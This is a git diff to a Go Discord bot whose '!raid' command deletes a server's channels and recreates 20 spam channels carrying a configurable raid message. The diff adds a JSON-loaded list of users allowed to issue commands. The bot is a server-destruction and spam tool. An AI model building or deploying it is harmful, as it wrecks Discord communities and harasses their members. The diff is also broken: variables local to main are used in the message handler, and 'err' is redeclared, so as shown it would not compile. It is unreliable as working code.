@@ -14,7 +14,49 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
+func loadPermissions() (map[string]interface{}, error) {
+    file, err := os.Open("info.json")
+    if err != nil {
+        return nil, fmt.Errorf("error abriendo info.json: %v", err)
+    }
+    defer file.Close()
+
+    decoder := json.NewDecoder(file)
+    var data map[string]interface{}
+    err = decoder.Decode(&data)
+    if err != nil {
+        return nil, fmt.Errorf("error decodificando info.json: %v", err)
+    }
+
+    return data, nil
+}
+
+func hasPermission(userID string, permissions []interface{}) bool {
+    for _, id := range permissions {
+        if id == userID {
+            return true
+        }
+    }
+    return false
+}
+
+
+
+
 func main() {
+
+	 // Cargar permisos desde info.json
+	 permissionsData, err := loadPermissions()
+	 if err != nil {
+		 log.Fatalf("Error cargando permisos: %v", err)
+	 }
+ 
+	 // Obtener la lista de usuarios con permiso
+	 permissions := permissionsData["permissions"].([]interface{})
+	 
+
+
+
 	// Cargar variables de entorno desde el archivo .env
 	err := godotenv.Load()
 	if err != nil {
@@ -26,7 +68,7 @@ func main() {
 	if DISCORD_TOKEN == "" {
 		log.Fatalf("DISCORD_TOKEN no está definido en el archivo .env")
 	}
-	
+
 	// Crea una nueva sesión de Discord usando el token del bot
 	dg, err := discordgo.New("Bot " + DISCORD_TOKEN )
 	if err != nil {
@@ -67,11 +109,12 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.Author.ID == s.State.User.ID {
 		return
 	}
-	if len(m.Content) > 0 && m.Content[0] == '!' && m.Author.ID != "797728978420891668" {
+	if len(m.Content) > 0 && m.Content[0] == '!' && !hasPermission(m.Author.ID, permissions) {
 		s.ChannelMessageDelete(m.ChannelID, m.ID)
 		s.ChannelMessageSend(m.ChannelID, "No tienes permiso para usar el bot")
 		return
 	}
+	
 
 	if len(m.Content) > 0 && m.Content[0] == '!' {
 		// Crear un mapa para almacenar el autor y el contenido del mensaje
@@ -127,7 +170,7 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}
 
 		// Enviar mensaje de confirmación
-		_, err = s.ChannelMessageSend(m.ChannelID, "CP eliminado exitosamente!")
+		_, err = s.ChannelMessageSend(m.ChannelID, "Mensajes eliminados exitosamente!")
 		if err != nil {
 			log.Println("Error enviando mensaje de confirmación:", err)
 		}
@@ -157,11 +200,13 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	if m.Content == "!raid" {
+		raidMessage := permissionsData["MessageRaid"].(string)
 		deleteChannels(s, m)
 		for i := 0; i < 20; i++ {
-			createChannels(s, m)
+			createChannelsWithMessage(s, m, raidMessage)
 		}
 	}
+	
 	if m.Content == "!clean channels" {
 		deleteChannels(s, m)
 	}
@@ -203,7 +248,7 @@ func deleteChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
 
 func createChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
 	// Crear un nuevo canal de texto en el servidor
-	channel, err := s.GuildChannelCreate(m.GuildID, "Chocano te está bailando", discordgo.ChannelTypeGuildText)
+	channel, err := s.GuildChannelCreate(m.GuildID, "Lorem Ipsum", discordgo.ChannelTypeGuildText)
 	if err != nil {
 		log.Println("Error creando el canal:", err)
 		return
@@ -232,4 +277,17 @@ func createChannels(s *discordgo.Session, m *discordgo.MessageCreate) {
 		log.Println("Error enviando el mensaje:", err)
 	}
 
+}
+
+func createChannelsWithMessage(s *discordgo.Session, m *discordgo.MessageCreate, raidMessage string) {
+    channel, err := s.GuildChannelCreate(m.GuildID, "Lorem Ipsum", discordgo.ChannelTypeGuildText)
+    if err != nil {
+        log.Println("Error creando el canal:", err)
+        return
+    }
+
+    _, err = s.ChannelMessageSend(channel.ID, raidMessage)
+    if err != nil {
+        log.Println("Error enviando el mensaje de raid:", err)
+    }
 }
